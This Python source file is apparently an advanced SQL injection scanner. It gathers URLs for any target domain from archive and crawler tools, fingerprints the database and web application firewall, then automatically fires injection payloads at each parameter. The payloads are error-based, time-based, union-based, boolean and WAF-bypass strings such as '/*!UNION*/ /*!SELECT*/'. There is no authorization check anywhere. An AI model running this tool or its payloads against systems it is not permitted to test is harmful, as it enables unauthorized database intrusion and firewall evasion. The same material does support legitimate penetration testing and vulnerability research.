#!/usr/bin/env python3
"""
Advanced SQL Injection Scanner with Enhanced Payload Management
Extended version with database fingerprinting and WAF bypass capabilities
"""

import json
import os
from typing import Dict, List, Set, Optional, Tuple
from sqli_scanner import *

class AdvancedPayloadManager:
    """Enhanced payload manager with database-specific payloads"""
    
    def __init__(self, config_file: str = "payloads.json"):
        self.config_file = config_file
        self.payloads = self.load_payloads()
        
    def load_payloads(self) -> Dict:
        """Load payloads from configuration file"""
        try:
            with open(self.config_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} Payload config file not found, using defaults")
            return self.get_default_payloads()
    
    def get_default_payloads(self) -> Dict:
        """Fallback default payloads"""
        return {
            "error_based": {"generic": ["'", "''", "' OR 1=1--", "' UNION SELECT NULL--"]},
            "time_based": {"generic": ["' AND SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--"]},
            "union_based": {"generic": ["' UNION SELECT 1,2,3--", "' ORDER BY 1--"]},
            "boolean_based": {"generic": ["' AND 1=1--", "' AND 1=2--"]},
            "bypass_filters": ["1' UnIoN SeLeCt 1,2,3--", "1'/**/AND/**/1=1--"],
            "waf_bypass": ["1' /*!UNION*/ /*!SELECT*/ 1,2,3--", "1' UNION/**/SELECT/**/1,2,3--"]
        }
    
    def get_payloads_by_type(self, payload_type: str, db_type: str = "generic") -> List[str]:
        """Get payloads filtered by type and database"""
        if payload_type not in self.payloads:
            return []
            
        payloads = self.payloads[payload_type]
        
        if isinstance(payloads, dict):
            if db_type in payloads:
                return payloads[db_type]
            elif "generic" in payloads:
                return payloads["generic"]
            else:
                # Return all payloads if no specific type found
                all_payloads = []
                for db_payloads in payloads.values():
                    all_payloads.extend(db_payloads)
                return all_payloads
        else:
            return payloads
    
    def get_all_payloads(self, db_type: str = "generic") -> List[str]:
        """Get all payloads for a specific database type"""
        all_payloads = []
        
        # Core payload types
        for payload_type in ["error_based", "time_based", "union_based", "boolean_based"]:
            all_payloads.extend(self.get_payloads_by_type(payload_type, db_type))
        
        # Add bypass payloads
        all_payloads.extend(self.get_payloads_by_type("bypass_filters"))
        all_payloads.extend(self.get_payloads_by_type("waf_bypass"))
        
        return list(set(all_payloads))  # Remove duplicates

class DatabaseFingerprinter:
    """Database fingerprinting functionality"""
    
    @staticmethod
    def detect_database_type(response_text: str, headers: Dict[str, str]) -> str:
        """Detect database type from response"""
        response_lower = response_text.lower()
        
        # MySQL indicators
        mysql_indicators = [
            "mysql", "mariadb", "you have an error in your sql syntax",
            "mysql_fetch", "mysql_num_rows", "mysql_connect"
        ]
        
        # PostgreSQL indicators
        postgres_indicators = [
            "postgresql", "postgres", "psql", "pg_", "postgre"
        ]
        
        # MSSQL indicators
        mssql_indicators = [
            "microsoft sql server", "sql server", "microsoft ole db",
            "microsoft jet database", "mssql", "sqlserver"
        ]
        
        # Oracle indicators
        oracle_indicators = [
            "oracle", "ora-", "plsql", "oracle error"
        ]
        
        # SQLite indicators
        sqlite_indicators = [
            "sqlite", "sqlite3", "sqlite error"
        ]
        
        # Check headers for server information
        server_header = headers.get('server', '').lower()
        
        # Database detection logic
        if any(indicator in response_lower for indicator in mysql_indicators):
            return "mysql"
        elif any(indicator in response_lower for indicator in postgres_indicators):
            return "postgresql"
        elif any(indicator in response_lower for indicator in mssql_indicators):
            return "mssql"
        elif any(indicator in response_lower for indicator in oracle_indicators):
            return "oracle"
        elif any(indicator in response_lower for indicator in sqlite_indicators):
            return "sqlite"
        elif "apache" in server_header or "nginx" in server_header:
            return "mysql"  # Default assumption for web servers
        else:
            return "generic"

class WAFDetector:
    """Web Application Firewall detection"""
    
    @staticmethod
    def detect_waf(response_text: str, headers: Dict[str, str], status_code: int) -> Optional[str]:
        """Detect WAF presence and type"""
        response_lower = response_text.lower()
        
        # Common WAF signatures
        waf_signatures = {
            "cloudflare": ["cloudflare", "cf-ray", "ray id"],
            "akamai": ["akamai", "ghost", "reference #"],
            "aws_waf": ["awswaf", "aws", "request blocked"],
            "imperva": ["imperva", "incapsula", "incap_ses"],
            "f5": ["f5", "bigip", "tmm info"],
            "barracuda": ["barracuda", "barra"],
            "sucuri": ["sucuri", "cloudproxy"],
            "wordfence": ["wordfence", "wfwaf"],
            "modsecurity": ["mod_security", "modsecurity", "not acceptable"],
            "generic": ["blocked", "forbidden", "access denied", "security", "firewall"]
        }
        
        # Check headers
        for header, value in headers.items():
            header_lower = header.lower()
            value_lower = value.lower() if value else ""
            
            for waf_name, signatures in waf_signatures.items():
                if any(sig in header_lower or sig in value_lower for sig in signatures):
                    return waf_name
        
        # Check response body
        for waf_name, signatures in waf_signatures.items():
            if any(sig in response_lower for sig in signatures):
                return waf_name
        
        # Check status codes that might indicate WAF
        if status_code in [403, 406, 501, 503]:
            return "generic"
        
        return None

class AdvancedSQLiScanner(SQLiScanner):
    """Advanced SQL injection scanner with enhanced capabilities"""
    
    def __init__(self, threads: int = 20, delay: float = 0.1, config_file: str = "payloads.json"):
        super().__init__(threads, delay)
        self.payload_manager = AdvancedPayloadManager(config_file)
        self.detected_database = "generic"
        self.detected_waf = None
        self.waf_bypass_mode = False
        
    async def fingerprint_target(self, url: str) -> Tuple[str, Optional[str]]:
        """Fingerprint target database and WAF"""
        try:
            async with self.session.get(url, allow_redirects=False) as response:
                response_text = await response.text()
                headers = dict(response.headers)
                
                # Detect database type
                db_type = DatabaseFingerprinter.detect_database_type(response_text, headers)
                
                # Detect WAF
                waf_type = WAFDetector.detect_waf(response_text, headers, response.status)
                
                return db_type, waf_type
                
        except Exception:
            return "generic", None
    
    async def test_advanced_payload(self, url: str, param: str, payload: str, 
                                   baseline: dict, payload_type: str) -> Optional[VulnResult]:
        """Test payload with advanced detection logic"""
        try:
            test_url = self.modify_url_parameter(url, param, payload)
            
            start_time = time.time()
            async with self.session.get(test_url, allow_redirects=False) as response:
                response_time = time.time() - start_time
                response_text = await response.text()
                headers = dict(response.headers)
                
            # Enhanced detection logic based on payload type
            vuln_detected = False
            confidence = 0
            evidence = []
            
            if payload_type == "error_based":
                # Check for database errors
                for indicator in self.error_indicators:
                    if re.search(indicator, response_text, re.IGNORECASE):
                        evidence.append(f"Error: {indicator}")
                        confidence += 30
                        vuln_detected = True
                        
            elif payload_type == "time_based":
                # Time-based detection with more precision
                if response_time > 4:
                    evidence.append(f"Delay: {response_time:.2f}s")
                    confidence += 40
                    vuln_detected = True
                    
            elif payload_type == "union_based":
                # Union-based detection
                length_diff = abs(len(response_text) - baseline.get('length', 0))
                if length_diff > 200:  # Significant change in response
                    evidence.append(f"Length change: {length_diff}")
                    confidence += 25
                    vuln_detected = True
                    
            elif payload_type == "boolean_based":
                # Boolean-based detection
                length_diff = abs(len(response_text) - baseline.get('length', 0))
                if 50 < length_diff < 500:  # Moderate change suggests boolean response
                    evidence.append(f"Boolean response: {length_diff}")
                    confidence += 20
                    vuln_detected = True
            
            # Additional detection: Status code changes
            if response.status != baseline.get('status', 200):
                evidence.append(f"Status: {response.status}")
                confidence += 15
                vuln_detected = True
            
            # WAF detection during testing
            if not self.detected_waf:
                self.detected_waf = WAFDetector.detect_waf(response_text, headers, response.status)
                if self.detected_waf:
                    print(f"{Colors.YELLOW}[WAF]{Colors.RESET} Detected {self.detected_waf} WAF")
                    self.waf_bypass_mode = True
            
            if vuln_detected and confidence >= 20:  # Minimum confidence threshold
                return VulnResult(
                    url=url,
                    parameter=param,
                    payload=payload,
                    response_time=response_time,
                    error_indicators=evidence,
                    response_length=len(response_text),
                    status_code=response.status,
                    vulnerability_type=f"{payload_type.replace('_', '-').title()} (confidence: {confidence}%)"
                )
                
        except asyncio.TimeoutError:
            if "SLEEP" in payload or "WAITFOR" in payload:
                return VulnResult(
                    url=url,
                    parameter=param,
                    payload=payload,
                    response_time=10.0,
                    error_indicators=["Timeout"],
                    response_length=0,
                    status_code=0,
                    vulnerability_type="Time-based (timeout)"
                )
        except Exception:
            pass
            
        return None
    
    async def scan_parameter_advanced(self, url: str, param: str) -> List[VulnResult]:
        """Advanced parameter scanning with adaptive payloads"""
        print(f"{Colors.YELLOW}[TESTING]{Colors.RESET} Parameter '{param}' in {url}")
        
        vulnerabilities = []
        
        # Fingerprint target first
        if self.detected_database == "generic":
            self.detected_database, self.detected_waf = await self.fingerprint_target(url)
            if self.detected_database != "generic":
                print(f"{Colors.CYAN}[DB]{Colors.RESET} Detected {self.detected_database} database")
            if self.detected_waf:
                print(f"{Colors.YELLOW}[WAF]{Colors.RESET} Detected {self.detected_waf} WAF")
                self.waf_bypass_mode = True
        
        # Get baseline response
        baseline = await self.get_baseline_response(url)
        
        # Test different payload types
        payload_types = ["error_based", "time_based", "union_based", "boolean_based"]
        
        for payload_type in payload_types:
            payloads = self.payload_manager.get_payloads_by_type(payload_type, self.detected_database)
            
            # Add WAF bypass payloads if WAF detected
            if self.waf_bypass_mode and payload_type in ["union_based", "error_based"]:
                waf_payloads = self.payload_manager.get_payloads_by_type("waf_bypass")
                payloads.extend(waf_payloads[:5])  # Add some WAF bypass payloads
            
            # Test payloads with rate limiting
            for i, payload in enumerate(payloads[:10]):  # Limit payloads per type
                if i > 0 and i % 3 == 0:
                    await asyncio.sleep(self.delay)
                    
                result = await self.test_advanced_payload(url, param, payload, baseline, payload_type)
                if result:
                    vulnerabilities.append(result)
                    print(f"{Colors.GREEN}[VULN]{Colors.RESET} Found {result.vulnerability_type} in parameter '{param}'")
                    
                    # If we found a vulnerability, try more targeted payloads
                    if payload_type == "error_based" and self.detected_database != "generic":
                        specific_payloads = self.payload_manager.get_payloads_by_type(
                            "error_based", self.detected_database
                        )[:5]
                        for specific_payload in specific_payloads:
                            if specific_payload != payload:
                                spec_result = await self.test_advanced_payload(
                                    url, param, specific_payload, baseline, payload_type
                                )
                                if spec_result:
                                    vulnerabilities.append(spec_result)
                                    
        return vulnerabilities

class AdvancedReportGenerator(ReportGenerator):
    """Enhanced report generator with detailed analysis"""
    
    @staticmethod
    def generate_advanced_summary(vulnerabilities: List[VulnResult], 
                                database_type: str, waf_type: Optional[str]) -> str:
        """Generate detailed vulnerability summary"""
        if not vulnerabilities:
            summary = f"{Colors.GREEN}[RESULT]{Colors.RESET} No SQL injection vulnerabilities found.\n"
            if database_type != "generic":
                summary += f"{Colors.BLUE}[INFO]{Colors.RESET} Detected database: {database_type}\n"
            if waf_type:
                summary += f"{Colors.YELLOW}[INFO]{Colors.RESET} Detected WAF: {waf_type}\n"
            return summary
        
        # Group vulnerabilities by type and confidence
        vuln_analysis = {}
        high_confidence = []
        medium_confidence = []
        low_confidence = []
        
        for vuln in vulnerabilities:
            vuln_type = vuln.vulnerability_type
            if "confidence:" in vuln_type:
                confidence = int(re.search(r'confidence: (\d+)%', vuln_type).group(1))
                if confidence >= 70:
                    high_confidence.append(vuln)
                elif confidence >= 40:
                    medium_confidence.append(vuln)
                else:
                    low_confidence.append(vuln)
            else:
                high_confidence.append(vuln)  # Assume high confidence for non-rated
            
            base_type = vuln_type.split('(')[0].strip()
            if base_type not in vuln_analysis:
                vuln_analysis[base_type] = []
            vuln_analysis[base_type].append(vuln)
        
        summary = f"\n{Colors.RED}{Colors.BOLD}[ADVANCED VULNERABILITY ANALYSIS]{Colors.RESET}\n"
        summary += f"{Colors.RED}Total vulnerabilities: {len(vulnerabilities)}{Colors.RESET}\n"
        
        if database_type != "generic":
            summary += f"{Colors.CYAN}Database type: {database_type}{Colors.RESET}\n"
        if waf_type:
            summary += f"{Colors.YELLOW}WAF detected: {waf_type}{Colors.RESET}\n"
        
        summary += "\n"
        
        # Confidence-based summary
        if high_confidence:
            summary += f"{Colors.RED}🚨 HIGH CONFIDENCE ({len(high_confidence)} vulnerabilities){Colors.RESET}\n"
            for vuln in high_confidence[:3]:
                summary += f"  └─ {Colors.CYAN}Parameter:{Colors.RESET} {vuln.parameter}\n"
                summary += f"     {Colors.CYAN}Type:{Colors.RESET} {vuln.vulnerability_type}\n"
                summary += f"     {Colors.CYAN}Evidence:{Colors.RESET} {', '.join(vuln.error_indicators[:2])}\n\n"
        
        if medium_confidence:
            summary += f"{Colors.YELLOW}⚠️  MEDIUM CONFIDENCE ({len(medium_confidence)} vulnerabilities){Colors.RESET}\n"
            for vuln in medium_confidence[:2]:
                summary += f"  └─ {Colors.CYAN}Parameter:{Colors.RESET} {vuln.parameter}\n"
                summary += f"     {Colors.CYAN}Type:{Colors.RESET} {vuln.vulnerability_type}\n\n"
        
        if low_confidence:
            summary += f"{Colors.BLUE}ℹ️  LOW CONFIDENCE ({len(low_confidence)} vulnerabilities){Colors.RESET}\n"
        
        # Recommendations
        summary += f"\n{Colors.BOLD}[RECOMMENDATIONS]{Colors.RESET}\n"
        if high_confidence:
            summary += f"{Colors.RED}• Immediate attention required for high-confidence vulnerabilities{Colors.RESET}\n"
        if waf_type:
            summary += f"{Colors.YELLOW}• WAF bypass techniques were attempted{Colors.RESET}\n"
        if database_type != "generic":
            summary += f"{Colors.CYAN}• Consider {database_type}-specific security measures{Colors.RESET}\n"
        
        return summary
    
    @staticmethod
    def save_advanced_report(vulnerabilities: List[VulnResult], domain: str, 
                           database_type: str, waf_type: Optional[str]):
        """Save enhanced JSON report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"advanced_sqli_report_{domain}_{timestamp}.json"
        
        # Group vulnerabilities by confidence
        high_conf = []
        medium_conf = []
        low_conf = []
        
        for vuln in vulnerabilities:
            if "confidence:" in vuln.vulnerability_type:
                confidence = int(re.search(r'confidence: (\d+)%', vuln.vulnerability_type).group(1))
                if confidence >= 70:
                    high_conf.append(vuln)
                elif confidence >= 40:
                    medium_conf.append(vuln)
                else:
                    low_conf.append(vuln)
            else:
                high_conf.append(vuln)
        
        report_data = {
            "scan_info": {
                "domain": domain,
                "timestamp": datetime.now().isoformat(),
                "total_vulnerabilities": len(vulnerabilities),
                "high_confidence": len(high_conf),
                "medium_confidence": len(medium_conf),
                "low_confidence": len(low_conf),
                "detected_database": database_type,
                "detected_waf": waf_type
            },
            "vulnerabilities": {
                "high_confidence": [
                    {
                        "url": vuln.url,
                        "parameter": vuln.parameter,
                        "payload": vuln.payload,
                        "vulnerability_type": vuln.vulnerability_type,
                        "response_time": vuln.response_time,
                        "status_code": vuln.status_code,
                        "response_length": vuln.response_length,
                        "evidence": vuln.error_indicators
                    } for vuln in high_conf
                ],
                "medium_confidence": [
                    {
                        "url": vuln.url,
                        "parameter": vuln.parameter,
                        "payload": vuln.payload,
                        "vulnerability_type": vuln.vulnerability_type,
                        "response_time": vuln.response_time,
                        "status_code": vuln.status_code,
                        "response_length": vuln.response_length,
                        "evidence": vuln.error_indicators
                    } for vuln in medium_conf
                ],
                "low_confidence": [
                    {
                        "url": vuln.url,
                        "parameter": vuln.parameter,
                        "payload": vuln.payload,
                        "vulnerability_type": vuln.vulnerability_type,
                        "response_time": vuln.response_time,
                        "status_code": vuln.status_code,
                        "response_length": vuln.response_length,
                        "evidence": vuln.error_indicators
                    } for vuln in low_conf
                ]
            }
        }
        
        with open(filename, 'w') as f:
            json.dump(report_data, f, indent=2)
            
        print(f"{Colors.GREEN}[REPORT]{Colors.RESET} Advanced report saved to {filename}")

async def advanced_main():
    """Main function for advanced scanner"""
    parser = argparse.ArgumentParser(
        description="Advanced SQL Injection Scanner with Database Fingerprinting",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Advanced Features:
  • Database fingerprinting (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
  • WAF detection and bypass attempts
  • Confidence-based vulnerability rating
  • Adaptive payload selection
  • Enhanced reporting with detailed analysis

Examples:
  python advanced_scanner.py -d example.com
  python advanced_scanner.py -d example.com --payloads payloads.json
  python advanced_scanner.py -d example.com -t 30 --aggressive
        """
    )
    
    parser.add_argument('-d', '--domain', required=True, help='Target domain to scan')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of concurrent threads')
    parser.add_argument('--delay', type=float, default=0.2, help='Delay between requests (default: 0.2s)')
    parser.add_argument('--payloads', default='payloads.json', help='Payload configuration file')
    parser.add_argument('--urls-file', help='File containing URLs to test')
    parser.add_argument('--output', help='Output file for JSON report')
    parser.add_argument('--aggressive', action='store_true', help='Use more aggressive scanning')
    parser.add_argument('--skip-tools', action='store_true', help='Skip external reconnaissance tools')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Set up logging
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    else:
        logging.basicConfig(level=logging.INFO)
    
    ReportGenerator.print_banner()
    print(f"{Colors.MAGENTA}[ADVANCED]{Colors.RESET} Enhanced SQL injection scanner with fingerprinting")
    
    print(f"{Colors.BLUE}[INFO]{Colors.RESET} Starting advanced scan for domain: {Colors.BOLD}{args.domain}{Colors.RESET}")
    print(f"{Colors.BLUE}[INFO]{Colors.RESET} Threads: {args.threads}, Delay: {args.delay}s")
    
    if args.aggressive:
        print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} Aggressive mode enabled - may trigger security measures")
    
    try:
        all_urls = set()
        
        if args.urls_file:
            # Load URLs from file
            try:
                with open(args.urls_file, 'r') as f:
                    for line in f:
                        url = line.strip()
                        if url and '?' in url:
                            all_urls.add(url)
                print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} Loaded {len(all_urls)} URLs from file")
            except FileNotFoundError:
                print(f"{Colors.RED}[ERROR]{Colors.RESET} File not found: {args.urls_file}")
                return
        else:
            # Use the same URL aggregation logic as the basic scanner
            async with URLAggregator(args.domain) as aggregator:
                wayback_urls = aggregator.get_wayback_urls()
                all_urls.update(wayback_urls)
                print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} Found {len(wayback_urls)} URLs from Wayback Machine")
                
                if not args.skip_tools:
                    gau_urls = aggregator.get_gau_urls()
                    all_urls.update(gau_urls)
                    print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} Found {len(gau_urls)} URLs from GAU")
                    
                    katana_urls = aggregator.get_katana_urls()
                    all_urls.update(katana_urls)
                    print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} Found {len(katana_urls)} URLs from Katana")
                
                common_urls = await aggregator.get_common_files_urls()
                all_urls.update(common_urls)
                print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} Generated {len(common_urls)} common endpoint URLs")
        
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} Total unique URLs collected: {Colors.BOLD}{len(all_urls)}{Colors.RESET}")
        
        if not all_urls:
            print(f"{Colors.RED}[ERROR]{Colors.RESET} No URLs found. Try using --urls-file option.")
            return
        
        # Extract parameters
        param_urls = ParameterExtractor.extract_parameters(all_urls)
        filtered_params = ParameterExtractor.filter_interesting_params(param_urls)
        
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} Found {len(param_urls)} unique parameters")
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} Filtered to {len(filtered_params)} interesting parameters")
        
        if not filtered_params:
            print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} No interesting parameters found for testing")
            return
        
        # Start advanced SQL injection scanning
        delay = args.delay if not args.aggressive else args.delay / 2
        async with AdvancedSQLiScanner(threads=args.threads, delay=delay, config_file=args.payloads) as scanner:
            vulnerabilities = []
            
            # Scan parameters with advanced logic
            for param, urls in filtered_params.items():
                for url in list(urls)[:3]:  # Limit to 3 URLs per parameter
                    param_vulns = await scanner.scan_parameter_advanced(url, param)
                    vulnerabilities.extend(param_vulns)
            
            detected_db = scanner.detected_database
            detected_waf = scanner.detected_waf
        
        # Generate and display advanced results
        summary = AdvancedReportGenerator.generate_advanced_summary(
            vulnerabilities, detected_db, detected_waf
        )
        print(summary)
        
        # Save advanced report
        if vulnerabilities or args.output:
            AdvancedReportGenerator.save_advanced_report(
                vulnerabilities, args.domain, detected_db, detected_waf
            )
        
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} Advanced scan completed!")
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[INFO]{Colors.RESET} Scan interrupted by user")
    except Exception as e:
        print(f"{Colors.RED}[ERROR]{Colors.RESET} Unexpected error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()

if __name__ == "__main__":
    asyncio.run(advanced_main())